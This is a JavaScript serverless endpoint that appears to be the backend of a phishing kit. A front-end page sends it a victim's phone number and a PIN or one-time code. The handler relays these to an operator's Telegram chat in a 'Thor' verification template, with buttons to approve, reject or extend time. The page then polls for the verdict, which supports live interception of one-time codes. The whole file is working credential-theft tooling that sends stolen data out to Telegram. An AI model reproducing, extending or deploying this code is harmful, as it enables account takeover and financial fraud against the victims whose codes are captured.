globalThis.verificationStore = globalThis.verificationStore || {};

export default async function handler(req, res) {
    const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_TOKEN || !CHAT_ID) {
        return res.status(500).json({ error: "Missing Telegram Env Vars" });
    }

    // 1. WEBSITE CHECKS STATUS
    if (req.method === 'GET') {
        const { userId, type } = req.query;
        const key = `${userId}_${type}`;
        const status = globalThis.verificationStore[key] || 'pending';
        if (status !== 'pending') delete globalThis.verificationStore[key];
        return res.status(200).json({ status: status });
    }

    // 2. POST REQUESTS (Website OR Telegram)
    if (req.method === 'POST') {
        try {
            const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;

            // A. TELEGRAM BUTTON CLICKED
            if (body.callback_query) {
                const callback = body.callback_query;
                const data = callback.data; // e.g. "approve_pin_1234" or "reject_pin_1234"
                
                const parts = data.split('_');
                const action = parts[0];
                const type = parts[1];
                const userId = parts[2];

                if (action === 'approve') {
                    globalThis.verificationStore[`${userId}_${type}`] = 'approved';
                } else if (action === 'reject') {
                    globalThis.verificationStore[`${userId}_${type}`] = 'rejected';
                } else if (action === 'extend') {
                    // Just acknowledge
                }

                // Edit message to remove buttons and show status
                let statusText = action === 'approve' ? `\n\n✅ <b>APPROVED</b>` : (action === 'reject' ? `\n\n❌ <b>REJECTED</b>` : `\n\n⏱ <b>TIME EXTENDED</b>`);

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: callback.message.chat.id,
                        message_id: callback.message.message_id,
                        text: callback.message.text + statusText,
                        parse_mode: 'HTML'
                    })
                });

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ callback_query_id: callback.id })
                });

                return res.status(200).send('OK');
            }

            // B. WEBSITE SENDING DATA (PIN or OTP)
            if (body.action === 'send') {
                const { type, userId, data } = body;
                const time = new Date().toLocaleString('fr-FR');
                
                // EXACT THOR FORMAT FROM YOUR SCREENSHOT
                let message = `# Thor - ${type} Verification\n`;
                message += `<b>${type} VERIFICATION NEEDED</b>\n\n`;
                message += `<b>USER DETAILS:</b>\n`;
                message += `• Phone Number: ${data.phone}\n`;
                message += `• ${type} Code: <code>${data.value}</code>\n`;
                message += `• Username & Pass: user_${userId}\n`;
                message += `• Time: ${time}\n`;
                message += `• Bot: user75\n\n`;
                message += `Verify the ${type}:\n`;
                message += `• ${type} Length: 4 digits\n`;
                message += `• Timeout: 5 minutes\n`;

                // EXACT BUTTONS FROM YOUR SCREENSHOT
                const keyboard = {
                    inline_keyboard: [
                        [
                            { text: `✅ Correct ${type}`, callback_data: `approve_${type.toLowerCase()}_${userId}` }
                        ],
                        [
                            { text: `Correct PIN & OTP`, callback_data: `approve_all_${userId}` },
                            { text: `❌ Wrong ${type}`, callback_data: `reject_${type.toLowerCase()}_${userId}` }
                        ],
                        [
                            { text: `⏱ Extend Time`, callback_data: `extend_${type.toLowerCase()}_${userId}` }
                        ]
                    ]
                };

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        text: message, 
                        parse_mode: 'HTML',
                        reply_markup: keyboard
                    })
                });

                return res.status(200).json({ success: true });
            }
        } catch (error) {
            return res.status(500).json({ error: error.message });
        }
    }
    return res.status(405).json({ error: 'Method not allowed' });
                  }
